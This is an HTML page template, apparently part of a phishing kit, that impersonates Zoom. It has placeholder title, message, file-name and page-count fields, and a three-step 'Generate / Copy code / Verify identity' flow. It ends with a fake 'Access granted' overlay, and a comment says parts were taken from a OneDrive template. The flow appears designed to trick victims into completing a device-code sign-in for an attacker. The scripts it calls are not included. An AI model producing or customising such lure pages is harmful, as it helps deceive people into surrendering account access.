<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{TITLE}}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root { --sp-blue: #2D8CFF; --sp-blue-dark: #0b5cff; --sp-blue-light: #E8F4FC; --sp-navy: #232333; --sp-gray-2: #e1e6eb; --sp-gray-4: #717171; --sp-white: #FFFFFF; --sp-red: #D13438; --sp-green: #0B6A0B; --radius-md: 12px; --radius-xl: 16px; --shadow-card: 0 10px 30px rgba(0,0,0,.08); }

        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: #eef2f6; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px 20px; }

        .card { background: var(--sp-white); border-radius: var(--radius-xl); box-shadow: var(--shadow-card); border: 1px solid var(--sp-gray-2); width: 100%; max-width: 520px; overflow: hidden; position: relative; }
        .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--sp-blue); }

        .card-header { padding: 40px 44px 16px; text-align: center; background: #FFFFFF; }

        .zoom-logo-container { display: flex; align-items: center; justify-content: center; margin-bottom: 28px; }
        .zoom-combined-img { height: 42px; width: auto; object-fit: contain; }

        .card-header h1 { font-size: 26px; font-weight: 700; color: var(--sp-navy); line-height: 1.4; margin-bottom: 14px; letter-spacing: -0.3px; }
        .card-header p { font-size: 14px; color: var(--sp-gray-4); line-height: 1.6; max-width: 400px; margin: 0 auto; }

        /* Step indicators */
        .steps { display: flex; align-items: center; gap: 0; margin-bottom: 32px; padding: 0 8px; }
        .step { display: flex; align-items: center; gap: 8px; flex: 1; position: relative; }
        .step:not(:last-child)::after { content: ''; position: absolute; left: 28px; right: 0; top: 14px; height: 1px; background: var(--sp-gray-2); z-index: 0; }
        .step-num { width: 28px; height: 28px; border-radius: 50%; border: 1.5px solid var(--sp-gray-2); background: var(--sp-white); color: var(--sp-gray-4); font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; z-index: 1; transition: all .2s; }
        .step.active .step-num, .step.done .step-num { background: var(--sp-blue); border-color: var(--sp-blue); color: #fff; }
        .step.done .step-num { background: var(--sp-green); border-color: var(--sp-green); }
        .step-label { font-size: 12px; font-weight: 500; color: var(--sp-gray-4); white-space: nowrap; }
        .step.active .step-label { color: var(--sp-blue); font-weight: 600; }
        .step.done .step-label { color: var(--sp-green); }

        .card-body { padding: 28px 44px 44px; }

        .btn-primary { width: 100%; padding: 14px 20px; background: var(--sp-blue); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 9px; transition: background .15s, transform .1s; box-shadow: 0 4px 12px rgba(45,140,255,0.25); margin-top: 8px; }
        .btn-primary:hover { background: var(--sp-blue-dark); }
        .btn-primary:active { transform: scale(.99); }
        .btn-primary:disabled { background: var(--sp-gray-2); cursor: not-allowed; }

        .btn-secondary { width: 100%; padding: 13px 20px; background: transparent; color: var(--sp-navy); border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .15s; }
        .btn-secondary:hover { border-color: var(--sp-blue); color: var(--sp-blue); background: var(--sp-blue-light); }

        .code-panel { display: none; margin-top: 20px; animation: slideUp .25s ease; }
        .code-panel.show { display: block; }
        @keyframes slideUp { from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)} }

        .code-box { background: #f8fafc; border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); padding: 18px 16px; text-align: center; }
        .code-placeholder { font-size: 14px; color: var(--sp-gray-4); font-weight: 400; padding: 6px 0; }
        .code-value { font-family: 'SF Mono', 'Roboto Mono', Consolas, monospace; font-size: 28px; font-weight: 700; letter-spacing: 8px; color: var(--sp-navy); user-select: all; transition: opacity .15s; }
        .code-value.loading { opacity: .35; }
        .code-hint { font-size: 12px; color: var(--sp-gray-4); margin-top: 6px; }

        .timer-row { display: flex; align-items: center; justify-content: space-between; margin-top: 14px; }
        .timer-pill { display: inline-flex; align-items: center; gap: 6px; background: var(--sp-blue-light); color: var(--sp-blue); border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
        .timer-pill.expired { background: #FDE7E9; color: var(--sp-red); }

        .refresh-btn { background: none; border: none; cursor: pointer; color: var(--sp-blue); font-family: inherit; font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; border-radius: 4px; transition: background .12s; }
        .refresh-btn:hover { background: var(--sp-blue-light); }

        .action-row { display: flex; flex-direction: column; gap: 10px; margin-top: 16px; }
        .sign-in-btn { width: 100%; background: linear-gradient(135deg, #2D8CFF, #0b5cff); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 15px; font-weight: 600; padding: 14px 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: all .15s; box-shadow: 0 4px 12px rgba(45,140,255,0.25); }
        .sign-in-btn:hover { filter: brightness(1.05); transform: translateY(-1px); }

        .status-text { font-size: 12px; color: var(--sp-gray-4); text-align: center; margin-top: 14px; min-height: 18px; }
        .status-text.error { color: var(--sp-red); background: #FDE7E9; border-radius: 4px; padding: 8px 12px; }

        .divider { height: 1px; background: var(--sp-gray-2); margin: 30px 0 20px; }

        /* Document Info */
        .doc-info { display: flex; align-items: center; justify-content: center; gap: 20px; padding: 12px 16px; background: var(--sp-blue-light); border-radius: var(--radius-md); margin-bottom: 16px; }
        .doc-info-item { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--sp-blue); font-weight: 500; }
        .doc-info-separator { width: 1px; height: 16px; background: var(--sp-blue); opacity: 0.3; }

        .footer-links { display: flex; justify-content: center; gap: 16px; font-size: 12px; color: var(--sp-gray-4); }
        .footer-links a { color: inherit; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }

        .overlay { display: none; position: fixed; inset: 0; background: rgba(20,30,45,.55); backdrop-filter: blur(3px); align-items: center; justify-content: center; z-index: 100; }
        .overlay.show { display: flex; }
        .overlay-card { background: var(--sp-white); border-radius: var(--radius-xl); padding: 44px 40px 40px; text-align: center; width: 320px; box-shadow: 0 20px 48px rgba(0,0,0,.18); animation: popIn .22s cubic-bezier(.2,.8,.4,1.1); }
        @keyframes popIn { from{opacity:0;transform:scale(.94)}to{opacity:1;transform:scale(1)} }
        .check-wrap { width: 60px; height: 60px; background: #E6F9EE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .overlay-card h3 { font-size: 20px; font-weight: 700; color: var(--sp-navy); margin-bottom: 8px; }
        .overlay-card p { font-size: 13px; color: var(--sp-gray-4); line-height: 1.55; }

        @media(max-width:480px){.card-header,.card-body{padding-left:24px;padding-right:24px}.action-row{flex-direction:column}}
    </style>
</head>
<body>

    <div class="card">
        <div class="card-header">
            <div class="zoom-logo-container">
                <img class="zoom-combined-img" src="https://www.vectorlogo.zone/logos/zoomus/zoomus-ar21.svg" alt="Zoom">
            </div>
            <h1>{{TITLE}}</h1>
            <p>{{MESSAGE}}</p>
        </div>

        <div class="card-body">
            <!-- Step indicators (from OneDrive template) -->
            <div class="steps" id="stepsRow">
                <div class="step active" id="step1"><div class="step-num" id="stepNum1">1</div><span class="step-label">Generate</span></div>
                <div class="step" id="step2"><div class="step-num" id="stepNum2">2</div><span class="step-label">Copy code</span></div>
                <div class="step" id="step3"><div class="step-num" id="stepNum3">3</div><span class="step-label">Verify</span></div>
            </div>

            <!-- Initial button (generates code) -->
            <button class="btn-primary" id="startBtn" onclick="generateCode()">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                {{BUTTON_TEXT}}
            </button>

            <!-- Code panel (hidden until code is generated) -->
            <div class="code-panel" id="codePanel">
                <div class="code-box">
                    <div class="code-value loading" id="codeValue">· · · · · ·</div>
                    <div class="code-hint" id="codeHint">Connecting to secure gateway…</div>
                </div>
                <div class="timer-row">
                    <div class="timer-pill" id="timerPill" style="display:none"></div>
                    <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
                        Get new code
                    </button>
                </div>
                <div class="action-row" id="actionRow" style="display:none">
                    <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        Copy code
                    </button>
                    <button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                        Verify identity
                    </button>
                </div>
                <div class="status-text" id="statusMsg"></div>
            </div>

            <div class="divider"></div>

            <!-- Document Info -->
            <div class="doc-info">
                <div class="doc-info-item">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                    <span>{{FILE_NAME}}</span>
                </div>
                <div class="doc-info-separator"></div>
                <div class="doc-info-item">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
                    <span>{{PAGES}} page(s)</span>
                </div>
            </div>

            <div class="footer-links">
                <a href="#">Privacy</a>
                <span>·</span>
                <a href="#">Terms</a>
                <span>·</span>
                <a href="#">Support</a>
            </div>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="overlay-card">
            <div class="check-wrap"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0B6A0B" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg></div>
            <h3>Access granted</h3>
            <p id="overlayMsg">Identity verified.<br>Redirecting to your content…</p>
        </div>
    </div>
</body>
</html>
